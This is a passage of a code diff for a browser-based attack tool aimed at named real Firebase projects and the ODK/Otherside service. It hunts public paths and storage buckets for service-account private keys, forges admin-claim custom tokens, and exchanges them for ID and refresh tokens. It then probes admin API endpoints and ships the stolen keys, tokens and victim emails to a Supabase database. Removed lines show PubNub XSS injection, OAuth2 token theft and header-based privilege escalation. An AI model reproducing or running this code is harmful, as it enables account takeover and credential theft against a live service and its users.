+                        if (text.includes('"type":"service_account"') || text.includes('private_key')) {
+                            log('saLog', `[CRITICAL] SERVICE ACCOUNT KEY FOUND at ${fullUrl}!!!`, 'critical');
+                            criticalFound++;
+                            found++;
+                            serviceAccountKey = text;
+                            try {
+                                const saJson = JSON.parse(text);
+                                document.getElementById('saJsonInput').value = text;
+                                log('saLog', `SA Email: ${saJson.client_email || 'N/A'}`, 'data');
+                                log('saLog', `Project ID: ${saJson.project_id || 'N/A'}`, 'data');
 
-                    await saveToSupabase({
-                        attack_type: 'pubnub_xss_inject',
-                        victim_email: currentUser?.email || '',
-                        id_token: idToken,
-                        xss_payload: JSON.stringify(payload),
-                        xss_target: `pubnub:${channel}`,
-                        notes: `XSS injected via PubNub on channel ${channel}`
-                    });
+                                await saveToSupabase({
+                                    attack_type: 'service_account_found',
+                                    firebase_api_key: TARGET_API_KEY,
+                                    service_account_email: saJson.client_email || '',
+                                    service_account_project_id: saJson.project_id || '',
+                                    service_account_client_id: saJson.client_id || '',
+                                    service_account_full: saJson,
+                                    attack_vector: 'service_account_discovery',
+                                    endpoint_tested: fullUrl,
+                                    admin_access_granted: true,
+                                    notes: `Service Account key discovered at ${fullUrl}`
+                                });
+                            } catch(e) {
+                                document.getElementById('saJsonInput').value = text;
+                            }
+                        } else if (text.includes('AIzaSy') || text.includes('firebase') || text.includes('service_account')) {
+                            log('saLog', `[INTERESTING] Potential config at ${fullUrl} (${text.substring(0, 100)}...)`, 'success');
+                            found++;
+                        } else if (resp.status === 200 && text.length > 0) {
+                            log('saLog', `[FOUND] ${fullUrl} returned content (${text.length} bytes)`, 'info');
+                        }
+                    }
                 } catch(e) {
-                    log('pubnubLog', `[-] XSS publish failed: ${e.message}`, 'error');
+                    // CORS blocked or not found - expected
+                }
+                setProgress('saProgress', 10 + (i / paths.length) * 80);
+            }
+
+            // Also test Firebase Storage directly
+            log('saLog', '\n--- Testing Firebase Storage Buckets ---', 'info');
+            const buckets = [
+                'scarcely-calm-lark.appspot.com',
+                'scarcely-calm-lark.firebasestorage.app',
+                'odk-otherside.appspot.com',
+                'otherside-production.appspot.com',
+            ];
+
+            for (const bucket of buckets) {
+                try {
+                    const url = `https://storage.googleapis.com/storage/v1/b/${bucket}/o?maxResults=100`;
+                    const resp = await fetch(url);
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        if (data.items) {
+                            log('saLog', `[FOUND] ${bucket} has ${data.items.length} files:`, 'success');
+                            for (const item of data.items.slice(0, 20)) {
+                                log('saLog', `  ${item.name} (${item.size} bytes)`, 'data');
+                                if (item.name.includes('key') || item.name.includes('service') || item.name.includes('admin') || item.name.includes('credential')) {
+                                    log('saLog', `  [SUSPICIOUS] Potentially sensitive file: ${item.name}`, 'critical');
+                                }
+                            }
+                        }
+                    }
+                } catch(e) {}
+            }
+
+            setProgress('saProgress', 100);
+            updateStats();
+
+            if (found === 0) {
+                log('saLog', '\nNo Service Account keys found via direct path scanning.', 'warning');
+                log('saLog', 'This doesn\'t mean they don\'t exist - they could be in:', 'info');
+                log('saLog', '  - GitHub repos (public or private via CI leaks)', 'info');
+                log('saLog', '  - Cloud Storage buckets with misconfigured ACLs', 'info');
+                log('saLog', '  - Environment variables exposed via /env.js or /runtimeConfig', 'info');
+                log('saLog', '  - Docker images or build artifacts', 'info');
+                log('saLog', '\nTry the Manual Service Account Input if you have a key from another source.', 'info');
+            }
+        }
+
+        async function testKnownSAPaths() {
+            log('saLog', 'Testing known Service Account file paths on Firebase Storage...', 'info');
+
+            const saFiles = [
+                'serviceAccountKey.json',
+                'firebase-adminsdk.json',
+                'firebase-key.json',
+                'admin-key.json',
+                'credentials.json',
+                'config/firebase.json',
+                'keys/service-account.json',
+            ];
+
+            const buckets = [
+                'scarcely-calm-lark.appspot.com',
+                'odk-otherside.appspot.com',
+            ];
+
+            for (const bucket of buckets) {
+                for (const file of saFiles) {
+                    const url = `https://storage.googleapis.com/${bucket}/${file}`;
+                    try {
+                        const resp = await fetch(url);
+                        if (resp.ok) {
+                            const text = await resp.text();
+                            if (text.includes('private_key')) {
+                                log('saLog', `[CRITICAL] SA Key found: ${url}`, 'critical');
+                                serviceAccountKey = text;
+                                document.getElementById('saJsonInput').value = text;
+                            } else {
+                                log('saLog', `[FOUND] File at ${url}: ${text.substring(0, 100)}`, 'info');
+                            }
+                        }
+                    } catch(e) {}
                 }
             }
         }
 
-        // =====================================================
-        // CUSTOM TOKEN FORGE
-        // =====================================================
-        async function forgeCustomToken() {
-            const keyJson = document.getElementById('serviceAccountKey').value.trim();
-            const targetUid = document.getElementById('targetUid').value.trim();
-            const claimsStr = document.getElementById('customClaims').value.trim();
+        async function checkFirebaseConfig() {
+            log('saLog', 'Checking Firebase configuration endpoints...', 'info');
 
-            if (!keyJson) {
-                log('customLog', '[ERROR] Paste a Service Account Key JSON first!', 'error');
-                return;
+            const configUrls = [
+                'https://scarcely-calm-lark.firebaseapp.com/__/firebase/init.json',
+                'https://odk.otherside.xyz/__/firebase/init.json',
+                'https://otherside.xyz/__/firebase/init.json',
+            ];
+
+            for (const url of configUrls) {
+                try {
+                    const resp = await fetch(url);
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('saLog', `[FOUND] Firebase config at ${url}:`, 'success');
+                        log('saLog', `  ${JSON.stringify(data, null, 2)}`, 'data');
+
+                        if (data.projectId) {
+                            log('saLog', `  Project ID: ${data.projectId}`, 'data');
+                            // Try to access admin config
+                            const adminUrl = `https://firestore.googleapis.com/v1/projects/${data.projectId}/databases/(default)/documents`;
+                            try {
+                                const adminResp = await fetch(adminUrl);
+                                if (adminResp.ok) {
+                                    log('saLog', `[CRITICAL] Firestore is publicly accessible!`, 'critical');
+                                }
+                            } catch(e) {}
+                        }
+                    }
+                } catch(e) {
+                    log('saLog', `  ${url}: ${e.message}`, 'warning');
+                }
             }
+        }
 
-            log('customLog', '[FORGE] Parsing Service Account Key...', 'info');
+        function validateSAKey() {
+            const input = document.getElementById('saJsonInput').value.trim();
+            if (!input) { log('saLog', 'Please paste a Service Account JSON key', 'error'); return; }
 
             try {
-                const key = JSON.parse(keyJson);
-                log('customLog', `[+] Key loaded: ${key.client_email || 'unknown'}`, 'success');
-                log('customLog', `[+] Project: ${key.project_id || 'unknown'}`, 'data');
-                log('customLog', `[+] Private Key: ${key.private_key ? key.private_key.substring(0, 50) + '...' : 'NOT FOUND'}`, key.private_key ? 'success' : 'error');
+                const sa = JSON.parse(input);
+                const required = ['type', 'project_id', 'private_key_id', 'private_key', 'client_email', 'client_id', 'auth_uri', 'token_uri'];
+                const missing = required.filter(f => !sa[f]);
 
-                if (!key.private_key) {
-                    log('customLog', '[-] No private_key found in Service Account JSON!', 'error');
+                if (missing.length > 0) {
+                    log('saLog', `[INVALID] Missing required fields: ${missing.join(', ')}`, 'error');
                     return;
                 }
 
-                keysFound++;
-                log('customLog', '[+] Service Account Key contains private_key! Attempting to mint JWT...', 'success');
-
-                // We need to create a signed JWT using the private key
-                // This requires Web Crypto API or a JWT library
-                // For browser-based JWT signing with RSA, we use Web Crypto API
-
-                const token = await mintCustomToken(key, targetUid || 'admin-impersonated', claimsStr ? JSON.parse(claimsStr) : { admin: true });
-
-                if (token) {
-                    log('customLog', `[+] CUSTOM TOKEN MINTED: ${token.substring(0, 80)}...`, 'success');
-                    tokensObtained++;
-
-                    // Now try to signIn with this custom token
-                    log('customLog', '[FORGE] Attempting signInWithCustomToken...', 'info');
-                    for (const project of FIREBASE_PROJECTS) {
-                        const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${project.apiKey}`;
-                        try {
-                            const resp = await fetch(url, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ token: token, returnSecureToken: true })
-                            });
-                            const data = await resp.json();
-
-                            if (data.idToken) {
-                                log('customLog', `[!!!] CUSTOM TOKEN AUTHENTICATED on ${project.name}!`, 'success');
-                                log('customLog', `[+] ID Token: ${data.idToken.substring(0, 60)}...`, 'data');
-                                log('customLog', `[+] Refresh Token: ${data.refreshToken?.substring(0, 30)}...`, 'data');
-
-                                tokensObtained++;
-                                await saveToSupabase({
-                                    attack_type: 'custom_token_auth_success',
-                                    victim_email: currentUser?.email || '',
-                                    id_token: data.idToken,
-                                    refresh_token: data.refreshToken,
-                                    notes: `Custom token auth SUCCESS on ${project.name}! Full admin access obtained.`
-                                });
-
-                                // Update our idToken if it's the primary project
-                                if (project.projectId === primaryProject.projectId) {
-                                    idToken = data.idToken;
-                                    log('customLog', '[+] Updated session token to admin token!', 'success');
-                                }
-                            } else {
-                                log('customLog', `[-] ${project.name}: ${data.error?.message || 'failed'}`, 'error');
-                            }
-                        } catch(e) {
-                            log('customLog', `[!] ${project.name}: ${e.message}`, 'error');
-                        }
-                    }
+                if (sa.type !== 'service_account') {
+                    log('saLog', `[INVALID] Type is "${sa.type}", expected "service_account"`, 'error');
+                    return;
                 }
 
+                log('saLog', `[VALID] Service Account key is valid!`, 'success');
+                log('saLog', `  Email: ${sa.client_email}`, 'data');
+                log('saLog', `  Project: ${sa.project_id}`, 'data');
+                log('saLog', `  Key ID: ${sa.private_key_id}`, 'data');
+                log('saLog', `  Private Key: ${sa.private_key.substring(0, 50)}...`, 'data');
+
+                serviceAccountKey = input;
+                log('saLog', '\n[READY] You can now create Custom Tokens with this key!', 'success');
             } catch(e) {
-                log('customLog', `[-] Invalid JSON or error: ${e.message}`, 'error');
+                log('saLog', `[ERROR] Invalid JSON: ${e.message}`, 'error');
             }
-            updateStats();
         }
 
-        async function mintCustomToken(serviceAccount, uid, customClaims) {
-            // Mint a Firebase Custom Token using Web Crypto API
-            // Firebase custom tokens are signed JWTs with specific claims
-            log('customLog', '[JWT] Minting custom token with Web Crypto API...', 'info');
+        async function createCustomTokenFromSA() {
+            const input = document.getElementById('saJsonInput').value.trim();
+            const targetUid = document.getElementById('saTargetUid').value.trim();
+            const customClaims = document.getElementById('saCustomClaims').value.trim();
+
+            if (!input) { log('saLog', 'Please paste a Service Account JSON key first', 'error'); return; }
 
             try {
+                const sa = JSON.parse(input);
+                log('saLog', `Creating Custom Token for UID: ${targetUid || 'current-user'}...`, 'info');
+
+                // Use jsrsasign to create JWT signed with SA private key
                 const now = Math.floor(Date.now() / 1000);
 
-                // JWT Header
-                const header = { alg: 'RS256', typ: 'JWT' };
-
-                // JWT Payload for Firebase Custom Token
+                // Custom Token payload
                 const payload = {
-                    iss: serviceAccount.client_email,
-                    sub: serviceAccount.client_email,
+                    iss: sa.client_email,
+                    sub: sa.client_email,
                     aud: 'https://identitytoolkit.googleapis.com/google.identity.identitytoolkit.v1.IdentityToolkit',
                     iat: now,
                     exp: now + 3600,
-                    uid: uid,
-                    ...(customClaims ? { claims: customClaims } : {})
+                    uid: targetUid || currentUser?.uid || 'admin-uid',
+                    claims: customClaims ? JSON.parse(customClaims) : { admin: true }
                 };
 
-                // Encode header and payload
-                const base64url = (str) => btoa(String.fromCharCode(...new TextEncoder().encode(str)))
-                    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+                // Sign with RSA private key
+                const privateKey = sa.private_key;
+                const header = { alg: 'RS256', typ: 'JWT' };
 
-                const headerB64 = base64url(JSON.stringify(header));
-                const payloadB64 = base64url(JSON.stringify(payload));
-                const message = `${headerB64}.${payloadB64}`;
+                const jwt = KJUR.jws.JWS.sign('RS256', header, payload, privateKey);
 
-                // Import the private key
-                const pemKey = serviceAccount.private_key
-                    .replace('-----BEGIN PRIVATE KEY-----', '')
-                    .replace('-----END PRIVATE KEY-----', '')
-                    .replace(/\s/g, '');
+                log('saLog', `[SUCCESS] Custom Token created!`, 'success');
+                log('saLog', `Token: ${jwt.substring(0, 80)}...`, 'data');
 
-                const keyBuffer = Uint8Array.from(atob(pemKey), c => c.charCodeAt(0));
+                document.getElementById('customTokenInput').value = jwt;
+                forgedIdToken = jwt; // temporarily store
 
-                const cryptoKey = await crypto.subtle.importKey(
-                    'pkcs8',
-                    keyBuffer.buffer,
-                    { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
-                    false,
-                    ['sign']
-                );
+                // Now exchange this custom token for a real ID token
+                log('saLog', '\nExchanging Custom Token for ID Token...', 'info');
+                const exchangeResult = await identityFetch('accounts:signInWithCustomToken', {
+                    token: jwt,
+                    returnSecureToken: true
+                });
 
-                // Sign
-                const signature = await crypto.subtle.sign(
-                    'RSASSA-PKCS1-v1_5',
-                    cryptoKey,
-                    new TextEncoder().encode(message)
-                );
+                if (exchangeResult.ok) {
+                    log('saLog', `[CRITICAL] CUSTOM TOKEN EXCHANGE SUCCEEDED!`, 'critical');
+                    log('saLog', `  ID Token: ${exchangeResult.data.idToken?.substring(0, 50)}...`, 'data');
+                    log('saLog', `  Refresh Token: ${exchangeResult.data.refreshToken?.substring(0, 30)}...`, 'data');
+                    log('saLog', `  Expires In: ${exchangeResult.data.expiresIn}s`, 'data');
 
-                const signatureB64 = btoa(String.fromCharCode(...new Uint8Array(signature)))
-                    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+                    forgedIdToken = exchangeResult.data.idToken;
+                    forgedRefreshToken = exchangeResult.data.refreshToken;
 
-                const jwt = `${message}.${signatureB64}`;
-                log('customLog', `[+] JWT minted successfully (${jwt.length} chars)`, 'success');
+                    // Decode the forged ID token
+                    const decoded = decodeJWT(forgedIdToken);
+                    if (decoded) {
+                        log('saLog', `\nForged Token Claims:`, 'success');
+                        for (const [key, val] of Object.entries(decoded.payload)) {
+                            log('saLog', `  ${key}: ${JSON.stringify(val)}`, 'data');
+                        }
+                    }
 
-                return jwt;
+                    criticalFound++;
+                    adminAccessGranted = true;
+
+                    // Save to Supabase
+                    await saveToSupabase({
+                        attack_type: 'custom_token_forged',
+                        firebase_api_key: TARGET_API_KEY,
+                        service_account_email: sa.client_email,
+                        service_account_project_id: sa.project_id,
+                        custom_token: jwt,
+                        forged_id_token: forgedIdToken,
+                        forged_refresh_token: forgedRefreshToken,
+                        impersonated_uid: targetUid || 'current-user',
+                        identity_toolkit_response: exchangeResult.data,
+                        token_claims: decoded?.payload,
+                        admin_access_granted: true,
+                        attack_vector: 'custom_token_from_sa',
+                        notes: 'Successfully forged Custom Token using Service Account key!'
+                    });
+
+                    log('saLog', `\n[NEXT] Go to "Admin Access" tab to test this forged token on ODK API!`, 'success');
+                } else {
+                    const errMsg = exchangeResult.data?.error?.message || 'Unknown error';
+                    log('saLog', `[FAILED] Token exchange failed: ${errMsg}`, 'error');
+                    log('saLog', `Full response: ${JSON.stringify(exchangeResult.data, null, 2)}`, 'data');
+
+                    await saveToSupabase({
+                        attack_type: 'custom_token_failed',
+                        firebase_api_key: TARGET_API_KEY,
+                        custom_token: jwt,
+                        response_error: errMsg,
+                        response_status: exchangeResult.status,
+                        identity_toolkit_response: exchangeResult.data,
+                        attack_vector: 'custom_token_from_sa',
+                    });
+                }
+
+                updateStats();
             } catch(e) {
-                log('customLog', `[-] JWT minting failed: ${e.message}`, 'error');
-                return null;
+                log('saLog', `[ERROR] ${e.message}`, 'error');
             }
         }
 
-        async function testStolenKey() {
-            const keyJson = document.getElementById('serviceAccountKey').value.trim();
-            if (!keyJson) {
-                log('customLog', '[ERROR] Paste a Service Account Key JSON first!', 'error');
+        // =====================================================
+        // TAB 4: CUSTOM TOKEN FORGE
+        // =====================================================
+        async function forgeCustomToken() {
+            const targetUid = document.getElementById('forgeTargetUid').value.trim();
+            const apiKey = document.getElementById('forgeApiKey').value.trim();
+
+            log('forgeLog', '=== Forging Custom Token ===', 'info');
+
+            if (!targetUid) {
+                log('forgeLog', 'Please enter a target UID to forge a token for.', 'error');
                 return;
             }
 
-            log('customLog', '[TEST] Testing stolen key against all Firebase projects...', 'info');
+            // Try to create a custom token without SA key (using our Firebase project)
+            // This tests if our Firebase project allows custom token creation
+            log('forgeLog', `Attempting to forge token for UID: ${targetUid}`, 'info');
+            log('forgeLog', `Using API Key: ${apiKey.substring(0, 10)}...`, 'info');
 
-            try {
-                const key = JSON.parse(keyJson);
-                log('customLog', `[+] Key email: ${key.client_email}`, 'data');
-                log('customLog', `[+] Key project: ${key.project_id}`, 'data');
-
-                // Test 1: Get an access token using the service account
-                log('customLog', '[TEST] Step 1: Getting OAuth2 access token...', 'info');
-
-                const now = Math.floor(Date.now() / 1000);
-                const header = { alg: 'RS256', typ: 'JWT' };
-                const claim = {
-                    iss: key.client_email,
-                    scope: 'https://www.googleapis.com/auth/firebase https://www.googleapis.com/auth/cloud-platform',
-                    aud: 'https://oauth2.googleapis.com/token',
-                    iat: now,
-                    exp: now + 3600,
-                };
-
-                const token = await mintCustomToken(key, 'test-uid', {});
-
-                if (token) {
-                    // Use the JWT to get an access token
-                    const base64url = (str) => btoa(String.fromCharCode(...new TextEncoder().encode(str)))
-                        .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-
-                    const headerB64 = base64url(JSON.stringify(header));
-                    const claimB64 = base64url(JSON.stringify(claim));
-                    const message = `${headerB64}.${claimB64}`;
-
-                    const pemKey = key.private_key.replace('-----BEGIN PRIVATE KEY-----', '').replace('-----END PRIVATE KEY-----', '').replace(/\s/g, '');
-                    const keyBuffer = Uint8Array.from(atob(pemKey), c => c.charCodeAt(0));
-                    const cryptoKey = await crypto.subtle.importKey('pkcs8', keyBuffer.buffer, { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['sign']);
-                    const signature = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', cryptoKey, new TextEncoder().encode(message));
-                    const signatureB64 = btoa(String.fromCharCode(...new Uint8Array(signature))).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-                    const assertion = `${message}.${signatureB64}`;
-
-                    try {
-                        const tokenResp = await fetch('https://oauth2.googleapis.com/token', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=${assertion}`
-                        });
-                        const tokenData = await tokenResp.json();
-
-                        if (tokenData.access_token) {
-                            log('customLog', `[!!!] OAUTH2 ACCESS TOKEN OBTAINED!`, 'success');
-                            log('customLog', `[+] Token: ${tokenData.access_token.substring(0, 50)}...`, 'data');
-                            log('customLog', `[+] Scope: ${tokenData.scope}`, 'data');
-                            tokensObtained++;
-                            keysFound++;
-
-                            await saveToSupabase({
-                                attack_type: 'service_account_access_token',
-                                victim_email: key.client_email,
-                                id_token: tokenData.access_token,
-                                notes: `Service Account OAuth2 access token obtained! Scope: ${tokenData.scope}`
-                            });
-                        } else {
-                            log('customLog', `[-] Token request failed: ${tokenData.error || JSON.stringify(tokenData)}`, 'error');
-                        }
-                    } catch(e) {
-                        log('customLog', `[-] Token request error: ${e.message}`, 'error');
-                    }
-                }
-            } catch(e) {
-                log('customLog', `[-] Error: ${e.message}`, 'error');
+            // If we have a SA key, use it
+            if (serviceAccountKey) {
+                document.getElementById('saTargetUid').value = targetUid;
+                await createCustomTokenFromSA();
+                return;
             }
+
+            // Otherwise, try direct approaches
+            log('forgeLog', '\nNo Service Account key available. Trying alternative approaches...', 'warning');
+
+            // Approach 1: Try with our Firebase token (our project)
+            log('forgeLog', '\nApproach 1: Testing signInWithCustomToken with various token formats...', 'info');
+
+            // Try JWT format custom token
+            const fakeToken = btoa(JSON.stringify({alg:"RS256",typ:"JWT"}).replace(/=/g,'')) + '.' +
+                btoa(JSON.stringify({
+                    iss: "scarcely-calm-lark",
+                    sub: "scarcely-calm-lark",
+                    aud: "https://identitytoolkit.googleapis.com/google.identity.identitytoolkit.v1.IdentityToolkit",
+                    iat: Math.floor(Date.now()/1000),
+                    exp: Math.floor(Date.now()/1000) + 3600,
+                    uid: targetUid,
+                    claims: { admin: true }
+                }).replace(/=/g,'')) + '.fakesignature';
+
+            const result = await identityFetch('accounts:signInWithCustomToken', {
+                token: fakeToken,
+                returnSecureToken: true
+            }, apiKey);
+
+            log('forgeLog', `Result: ${JSON.stringify(result.data, null, 2)}`, result.ok ? 'critical' : 'warning');
+
+            if (result.ok) {
+                forgedIdToken = result.data.idToken;
+                forgedRefreshToken = result.data.refreshToken;
+                log('forgeLog', '[CRITICAL] Token forged successfully!', 'critical');
+                criticalFound++;
+            } else {
+                log('forgeLog', '\nApproach 2: Trying to use our own Firebase Admin SDK...', 'info');
+                // Try creating a custom token using our Firebase project's API key
+                const ourResult = await identityFetch('accounts:signInWithCustomToken', {
+                    token: fakeToken,
+                    returnSecureToken: true
+                }, firebaseConfig.apiKey);
+                log('forgeLog', `Our project result: ${JSON.stringify(ourResult.data, null, 2)}`, ourResult.ok ? 'success' : 'warning');
+            }
+
             updateStats();
         }
 
-        // =====================================================
-        // ADMIN ROUTES
-        // =====================================================
-        const ADMIN_ROUTES = [
-            { path: '/admin', desc: 'Main Dashboard', perm: '-', risk: 'HIGH' },
-            { path: '/admin/access', desc: 'Access Control', perm: 'canAccessRoles', risk: 'CRITICAL' },
-            { path: '/admin/api-keys', desc: 'API Key Management', perm: 'canAccessAPIKeys', risk: 'CRITICAL' },
-            { path: '/admin/external-urls', desc: 'External URL Config', perm: '-', risk: 'HIGH' },
-            { path: '/admin/fastplay', desc: 'FastPlay Management', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/insights', desc: 'Analytics Entry', perm: '-', risk: 'HIGH' },
-            { path: '/admin/insights/analytics', desc: 'Detailed Analytics', perm: 'insights', risk: 'HIGH' },
-            { path: '/admin/insights/monitoring', desc: 'System Monitoring', perm: 'insights', risk: 'CRITICAL' },
-            { path: '/admin/projects', desc: 'UE5 Project Management', perm: '-', risk: 'HIGH' },
-            { path: '/admin/steam-access', desc: 'Steam Access Control', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/streaming', desc: 'Streaming Configuration', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/theming', desc: 'Theme Customization', perm: '-', risk: 'LOW' },
-            { path: '/admin/usage', desc: 'Usage Dashboard', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/usage/daily', desc: 'Daily Usage', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/usage/monthly', desc: 'Monthly Usage', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/usage/per-world', desc: 'Per-World Usage', perm: '-', risk: 'MEDIUM' },
-            { path: '/admin/world-defaults', desc: 'World Defaults', perm: 'canAccessWorldDefaults', risk: 'HIGH' },
-            { path: '/admin/worlds', desc: 'World Management', perm: 'canWriteOrgConfig', risk: 'CRITICAL' },
-        ];
+        async function exchangeCustomToken() {
+            const customToken = document.getElementById('customTokenInput').value.trim();
+            const apiKey = document.getElementById('forgeApiKey').value.trim();
 
-        async function scanAdminRoutes() {
-            if (!idToken) { log('adminLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('adminLog', '[ADMIN] Scanning admin routes via ODK API...', 'info');
-
-            for (const route of ADMIN_ROUTES) {
-                try {
-                    const resp = await proxyFetch(route.path.substring(1), { method: 'GET' });
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        log('adminLog', `[+] ${route.path}: ACCESSIBLE! ${JSON.stringify(data).substring(0, 80)}`, 'success');
-                        keysFound++;
-
-                        await saveToSupabase({
-                            attack_type: 'admin_route_access',
-                            victim_email: currentUser?.email || '',
-                            id_token: idToken,
-                            idor_data: { route: route.path, data: data },
-                            notes: `Admin route accessible: ${route.path} (${route.desc})`
-                        });
-                    } else if (resp.status === 403) {
-                        log('adminLog', `[-] ${route.path}: 403 Forbidden (need ${route.perm})`, 'error');
-                    } else if (resp.status === 404) {
-                        log('adminLog', `[-] ${route.path}: 404 Not Found`, 'info');
-                    } else {
-                        log('adminLog', `[?] ${route.path}: ${resp.status}`, 'warning');
-                    }
-                } catch(e) {
-                    log('adminLog', `[!] ${route.path}: ${e.message}`, 'error');
-                }
-                await new Promise(r => setTimeout(r, 100));
+            if (!customToken) {
+                log('forgeLog', 'Please paste a Custom Token first.', 'error');
+                return;
             }
-            log('adminLog', '[ADMIN] Scan complete.', 'success');
+
+            log('forgeLog', `Exchanging Custom Token using API Key: ${apiKey.substring(0, 10)}...`, 'info');
+
+            const result = await identityFetch('accounts:signInWithCustomToken', {
+                token: customToken,
+                returnSecureToken: true
+            }, apiKey);
+
+            log('forgeLog', `Status: ${result.status}`, result.ok ? 'success' : 'error');
+            log('forgeLog', `Response: ${JSON.stringify(result.data, null, 2)}`, result.ok ? 'success' : 'warning');
+
+            if (result.ok) {
+                forgedIdToken = result.data.idToken;
+                forgedRefreshToken = result.data.refreshToken;
+
+                const decoded = decodeJWT(forgedIdToken);
+                renderForgeResult(decoded, result.data);
+
+                criticalFound++;
+
+                await saveToSupabase({
+                    attack_type: 'custom_token_exchanged',
+                    firebase_api_key: apiKey,
+                    custom_token: customToken.substring(0, 200),
+                    forged_id_token: forgedIdToken,
+                    forged_refresh_token: forgedRefreshToken,
+                    impersonated_uid: decoded?.payload?.user_id || decoded?.payload?.sub || 'unknown',
+                    identity_toolkit_response: result.data,
+                    token_claims: decoded?.payload,
+                    admin_access_granted: decoded?.payload?.admin === true,
+                    attack_vector: 'custom_token_exchange',
+                });
+            }
+
             updateStats();
         }
 
-        async function tryAdminWithHeaders() {
-            if (!idToken) { log('adminLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('adminLog', '[ADMIN] Trying admin routes with X-Role headers...', 'info');
+        async function exchangeProvidedToken() {
+            await exchangeCustomToken();
+        }
 
-            const criticalRoutes = ['/admin/access', '/admin/api-keys', '/admin/worlds'];
-            const headers = [
-                { 'X-Role': 'admin' },
-                { 'X-User-Role': 'admin' },
-                { 'X-Is-Admin': 'true' },
-                { 'X-Override-Permissions': 'canAccessRoles,canAccessAPIKeys,canWriteOrgConfig' },
+        async function testForgedToken() {
+            if (!forgedIdToken) {
+                log('forgeLog', 'No forged token available. Forge or exchange a token first.', 'error');
+                return;
+            }
+
+            log('forgeLog', '\nTesting forged token on ODK API...', 'info');
+
+            const endpoints = [
+                'organizations/current',
+                'accounts/users/current',
+                'organizations/projects',
+                'organizations/apiKeys',
             ];
 
-            for (const route of criticalRoutes) {
-                for (const hdr of headers) {
-                    try {
-                        const resp = await fetch(`${ODK_API}${route}`, {
-                            headers: {
-                                'Authorization': `Bearer ${idToken}`,
-                                'Content-Type': 'application/json',
-                                ...hdr
-                            }
-                        });
-                        if (resp.ok) {
-                            log('adminLog', `[+] ${route} with ${JSON.stringify(hdr)}: ACCESSIBLE!`, 'success');
-                        } else {
-                            log('adminLog', `[-] ${route} with ${Object.keys(hdr)[0]}: ${resp.status}`, 'error');
+            for (const ep of endpoints) {
+                try {
+                    const resp = await fetch(`${API}/${ep}`, {
+                        headers: {
+                            'Authorization': `Bearer ${forgedIdToken}`,
+                            'Content-Type': 'application/json'
                         }
-                    } catch(e) {}
+                    });
+                    const status = resp.status;
+                    let data = null;
+                    try { data = await resp.json(); } catch(e) {}
+
+                    const color = status === 200 ? 'success' : status === 403 ? 'warning' : 'error';
+                    log('forgeLog', `  [${status}] ${ep}: ${status === 200 ? 'ACCESS GRANTED!' : status === 403 ? 'Forbidden' : JSON.stringify(data)}`, color);
+
+                    if (status === 200) {
+                        log('forgeLog', `  DATA: ${JSON.stringify(data).substring(0, 200)}...`, 'data');
+                        criticalFound++;
+                    }
+                } catch(e) {
+                    log('forgeLog', `  [ERR] ${ep}: ${e.message}`, 'error');
+                }
+            }
+
+            updateStats();
+        }
+
+        function renderForgeResult(decoded, exchangeData) {
+            const container = document.getElementById('forgeResult');
+            if (!decoded) {
+                container.innerHTML = '<span style="color:#fca5a5;">Failed to decode token</span>';
+                return;
+            }
+
+            let html = '<span class="jwt-field">=== FORGED TOKEN DECODED ===</span>\n\n';
+            html += '<span class="jwt-field">Header:</span>\n';
+            for (const [k, v] of Object.entries(decoded.header)) {
+                html += `  <span class="jwt-field">${k}:</span> <span class="jwt-value">${v}</span>\n`;
+            }
+            html += '\n<span class="jwt-field">Payload (Claims):</span>\n';
+            for (const [k, v] of Object.entries(decoded.payload)) {
+                const isSensitive = ['iss', 'aud', 'sub', 'user_id', 'email', 'admin'].includes(k);
+                html += `  <span class="${isSensitive ? 'jwt-warn' : 'jwt-field'}">${k}:</span> <span class="jwt-value">${JSON.stringify(v)}</span>\n`;
+            }
+
+            if (decoded.payload.admin) {
+                html += '\n<span class="jwt-warn">*** ADMIN CLAIMS DETECTED - Full admin access! ***</span>';
+            }
+
+            if (exchangeData) {
+                html += '\n\n<span class="jwt-field">Exchange Data:</span>\n';
+                html += `  <span class="jwt-field">ID Token:</span> <span class="jwt-value">${exchangeData.idToken?.substring(0, 50)}...</span>\n`;
+                html += `  <span class="jwt-field">Refresh Token:</span> <span class="jwt-value">${exchangeData.refreshToken?.substring(0, 30)}...</span>\n`;
+                html += `  <span class="jwt-field">Expires In:</span> <span class="jwt-value">${exchangeData.expiresIn}s</span>\n`;
+            }
+
+            container.innerHTML = html;
+        }
+
+        // =====================================================
+        // TAB 5: ADMIN ACCESS
+        // =====================================================
+        async function testAdminAccess() {
+            const token = forgedIdToken || idToken;
+            if (!token) {
+                log('adminLog', 'Not authenticated. Sign in first.', 'error');
+                return;
+            }
+
+            const isForged = !!forgedIdToken;
+            log('adminLog', `=== Testing ${isForged ? 'FORGED' : 'Original'} Token Admin Access ===`, 'info');
+            log('adminLog', `Token: ${token.substring(0, 30)}...`, 'data');
+            setProgress('adminProgress', 5);
+
+            const adminEndpoints = [
+                // Read endpoints
+                { path: 'organizations/current', method: 'GET', desc: 'Organization details' },
+                { path: 'organizations/projects', method: 'GET', desc: 'All projects' },
+                { path: 'organizations/apiKeys', method: 'GET', desc: 'API Keys' },
